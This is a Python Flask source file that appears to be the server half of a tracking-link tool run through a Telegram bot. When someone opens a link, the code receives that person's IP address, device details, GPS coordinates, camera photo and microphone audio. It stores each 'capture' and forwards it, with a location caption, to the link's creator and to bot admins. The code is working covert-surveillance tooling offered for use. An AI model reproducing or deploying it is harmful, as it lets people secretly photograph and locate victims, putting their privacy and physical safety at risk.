import os
import json
import base64
import logging
from flask import Flask, request, jsonify
import requests
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
DATA_DIR = '/tmp/bot_data'

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, 'photos'), exist_ok=True)

def get_links():
    path = os.path.join(DATA_DIR, 'links.json')
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f)
    return {}

def save_links(data):
    path = os.path.join(DATA_DIR, 'links.json')
    with open(path, 'w') as f:
        json.dump(data, f)

def send_photo_to_chat(chat_id, photo_b64, caption):
    try:
        photo_bytes = base64.b64decode(photo_b64.split(',')[1] if ',' in photo_b64 else photo_b64)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
        data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
        requests.post(url, files=files, data=data)
    except Exception as e:
        logger.error(f"Send photo error: {e}")

def send_text_to_chat(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'})
    except Exception as e:
        logger.error(f"Send text error: {e}")

@app.route('/', methods=['POST'])
@app.route('/<link_id>', methods=['POST'])
def capture(link_id=None):
    """Receive captured data"""
    try:
        # Extract link_id from path
        path = request.path.strip('/')
        if path:
            link_id = path
        
        if not link_id:
            return jsonify({'error': 'Missing link_id'}), 400
        
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data'}), 400
        
        links = get_links()
        if link_id not in links:
            return jsonify({'error': 'Invalid link'}), 404
        
        link_data = links[link_id]
        creator_id = link_data['creator_id']
        
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown').split(',')[0].strip()
        
        capture_record = {
            'ip': client_ip,
            'user_agent': data.get('user_agent', 'Unknown'),
            'timestamp': data.get('timestamp', datetime.now().isoformat()),
            'screen_res': data.get('screen_res', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'language': data.get('language', 'Unknown'),
            'hasCamera': data.get('hasCamera', False),
            'hasMic': data.get('hasMic', False),
            'hasLocation': data.get('hasLocation', False),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'photo': data.get('photo'),
            'audio': data.get('audio')
        }
        
        link_data['captures'].append(capture_record)
        links[link_id] = link_data
        save_links(links)
        
        # Build notification
        perms = []
        if data.get('hasCamera'): perms.append('📸 Camera')
        if data.get('hasMic'): perms.append('🎙️ Mic')
        if data.get('hasLocation'): perms.append('📍 Location')
        
        caption = (
            f"⚠️ **New Capture!**\n\n"
            f"🔗 Link: `{link_id}`\n"
            f"🌐 IP: `{client_ip}`\n"
            f"📱 Platform: {data.get('platform', 'Unknown')}\n"
            f"🖥️ Screen: {data.get('screen_res', 'Unknown')}\n"
            f"✅ Permissions: {', '.join(perms) if perms else 'None'}\n"
        )
        
        if data.get('latitude') and data.get('longitude'):
            caption += f"📍 [{data['latitude']}, {data['longitude']}]\n"
            if data.get('accuracy'):
                caption += f"📍 ±{data['accuracy']}m\n"
        
        if data.get('photo'):
            send_photo_to_chat(creator_id, data['photo'], caption)
        else:
            send_text_to_chat(creator_id, caption)
        
        # Also notify admins
        admin_ids_raw = os.environ.get('ADMIN_IDS', '')
        admin_ids = [int(x.strip()) for x in admin_ids_raw.split(',') if x.strip()]
        for admin_id in admin_ids:
            if admin_id != creator_id:
                admin_cap = f"📸 Capture by {link_data.get('creator_name', 'Unknown')}\n\n{caption}"
                if data.get('photo'):
                    send_photo_to_chat(admin_id, data['photo'], admin_cap)
                else:
                    send_text_to_chat(admin_id, admin_cap)
        
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def health():
    return 'Capture endpoint active ✅', 200
